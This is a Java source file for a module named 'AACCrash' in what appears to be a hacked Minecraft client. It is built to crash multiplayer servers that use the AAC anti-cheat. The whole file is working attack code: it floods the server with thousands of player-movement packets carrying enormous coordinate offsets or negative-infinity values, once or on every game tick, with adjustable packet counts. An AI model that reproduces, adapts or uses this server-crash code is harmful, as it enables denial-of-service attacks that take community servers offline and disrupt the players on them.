package kultklient.legacy.client.systems.modules.crash;

import kultklient.legacy.client.eventbus.EventHandler;
import kultklient.legacy.client.events.game.GameLeftEvent;
import kultklient.legacy.client.events.world.TickEvent;
import kultklient.legacy.client.settings.*;
import kultklient.legacy.client.systems.modules.Categories;
import kultklient.legacy.client.systems.modules.Module;
import kultklient.legacy.client.utils.Utils;
import net.minecraft.item.Items;
import net.minecraft.network.packet.c2s.play.PlayerMoveC2SPacket;

/*/--------------------------/*/
/*/ Made by 0x150            /*/
/*/ https://github.com/0x150 /*/
/*/--------------------------/*/

public class AACCrash extends Module {
    private final SettingGroup sgGeneral = settings.getDefaultGroup();

    private final Setting<Mode> crashMode = sgGeneral.add(new EnumSetting.Builder<Mode>()
        .name("mode")
        .description("Which crash mode to use.")
        .defaultValue(Mode.New)
        .build()
    );

    private final Setting<Integer> amount = sgGeneral.add(new IntSetting.Builder()
        .name("amount")
        .description("How many packets to send to the server.")
        .defaultValue(5000)
        .min(1)
        .sliderRange(1, 100000)
        .build()
    );

    private final Setting<Boolean> onTick = sgGeneral.add(new BoolSetting.Builder()
        .name("on-tick")
        .description("Sends the packets every tick.")
        .defaultValue(false)
        .build()
    );

    private final Setting<Boolean> autoDisable = sgGeneral.add(new BoolSetting.Builder()
        .name("auto-disable")
        .description("Disables the module on kick/leave.")
        .defaultValue(true)
        .build()
    );

    public AACCrash() {
        super(Categories.Crash, Items.BARRIER, "aac-crash", "Supposed crash methods for servers using AAC. (By 0x150)");
    }

    @Override
    public void onActivate() {
        if (Utils.canUpdate() && !onTick.get()) {
            switch (crashMode.get()) {
                case New -> {
                    for (double i = 0; i < amount.get(); i++) {
                        mc.getNetworkHandler().sendPacket(new PlayerMoveC2SPacket.PositionAndOnGround(mc.player.getX() + (9412 * i), mc.player.getY() + (9412 * i), mc.player.getZ() + (9412 * i), true));
                    }
                }
                case Old -> mc.getNetworkHandler().sendPacket(new PlayerMoveC2SPacket.PositionAndOnGround(Double.NEGATIVE_INFINITY, Double.NEGATIVE_INFINITY, Double.NEGATIVE_INFINITY, true));
                case Other -> {
                    for (double i = 0; i < amount.get(); i++) {
                        mc.getNetworkHandler().sendPacket(new PlayerMoveC2SPacket.PositionAndOnGround(mc.player.getX() + (500000 * i), mc.player.getY() + (500000 * i), mc.player.getZ() + (500000 * i), true));
                    }
                }
            }
            if (autoDisable.get()) toggle();
        }
    }

    @EventHandler
    public void onTick(TickEvent.Pre tickEvent) {
        if (onTick.get()) {
            switch (crashMode.get()) {
                case New -> {
                    for (double i = 0; i < amount.get(); i++) {
                        mc.getNetworkHandler().sendPacket(new PlayerMoveC2SPacket.PositionAndOnGround(mc.player.getX() + (9412 * i), mc.player.getY() + (9412 * i), mc.player.getZ() + (9412 * i), true));
                    }
                }
                case Old -> {
                    for (double i = 0; i < amount.get(); i++) {
                        mc.getNetworkHandler().sendPacket(new PlayerMoveC2SPacket.PositionAndOnGround(Double.NEGATIVE_INFINITY, Double.NEGATIVE_INFINITY, Double.NEGATIVE_INFINITY, true));
                    }
                }
                case Other -> {
                    for (double i = 0; i < amount.get(); i++) {
                        mc.getNetworkHandler().sendPacket(new PlayerMoveC2SPacket.PositionAndOnGround(mc.player.getX() + (500000 * i), mc.player.getY() + (500000 * i), mc.player.getZ() + (500000 * i), true));
                    }
                }
            }
        }
    }

    @EventHandler
    private void onGameLeft(GameLeftEvent event) {
        if (autoDisable.get()) toggle();
    }

    public enum Mode {
        New,
        Old,
        Other
    }
}
